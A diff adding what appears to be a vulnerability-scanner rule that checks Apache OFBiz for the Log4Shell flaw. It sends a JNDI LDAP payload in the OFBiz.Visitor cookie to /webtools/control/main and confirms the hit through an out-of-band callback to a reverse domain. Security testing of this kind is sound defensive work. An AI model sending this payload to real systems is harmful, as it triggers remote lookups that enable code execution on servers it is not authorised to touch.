@@ -1,0 +1,13 @@
+name: apache-ofbiz-log4j-rce
+set:
+  reverse: newReverse()
+  reverseURL: reverse.domain
+rules:
+  r0:
+    request:
+      method: GET
+      path: /webtools/control/main
+      headers:
+        Cookie: OFBiz.Visitor=${jndi:ldap://{{reverseURL}}}
+    expression: reverse.wait(5)
+expression:  r0()
